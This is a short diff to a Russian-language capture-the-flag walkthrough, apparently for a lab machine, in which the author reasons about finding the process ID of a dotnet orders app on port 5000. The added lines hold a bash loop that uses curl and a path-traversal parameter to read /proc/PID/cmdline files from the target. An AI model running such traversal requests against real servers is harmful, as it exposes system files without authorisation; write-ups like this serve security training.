@@ -194,3 +194,8 @@ def order(): # don't forget to run the order app first with "dotnet <path to .dl
 ![image](https://user-images.githubusercontent.com/77785989/235319129-cd219465-f809-4461-9c2d-45b013b8ae22.png)
 
 Я предполагаю, что для доступа к orders необходимо запустить приложение dotnet, это приложение работает на порту 5000. попробуем поискать в процессах идентификатор.
+
+Запускаем поиск данного процесса:
+```
+for i in $(seq 900 1000); do curl 10.10.11.201:8000/?page=../../../../proc/$i/cmdline -o -; echo "  PID => $i"; done
+```
